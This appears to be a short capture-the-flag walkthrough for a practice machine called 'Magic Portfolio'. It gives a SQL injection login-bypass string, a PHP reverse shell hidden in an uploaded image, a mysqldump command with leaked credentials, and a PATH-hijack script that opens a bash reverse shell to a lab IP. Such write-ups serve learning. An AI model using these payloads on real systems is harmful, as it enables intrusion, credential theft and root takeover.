Started with a nmap scan
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Going to the website all we have is a login page and we have sql injection with this `admin' or 'a'='a';-- -` and we url encode the spaces with `+` and we have bypassed the login and we have a upload page now and we can only upload pictures but we dont know were they go to so running a gobuster scan `/images/uploads/` so if we use exiftool and put a reverse shell into a good image and then add a `.php.jpg` and upload it then we go to it on the webserver and now we have a shell on the machine so looking around we find there is a `db.php` file with the mysql creds in there and there is no `mysql` binary on the host but there is `mysqldump` `mysqldump --all-databases --password=iamkingtheseus > /tmp/db.sql` and now we have new plain text creds `Th3s3usW4sK1ng` and this is the password for the user account now running linpeas and there is a `SUID` in a binary at `/bin/sysinfo` looking at are path and this binary we can do a PATH hijack `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.4/443 0>&1' > fdisk` and then do `chmod +x fdisk` and then do `export PATH="/tmp:$PATH"` and then run sysinfo and now we are root 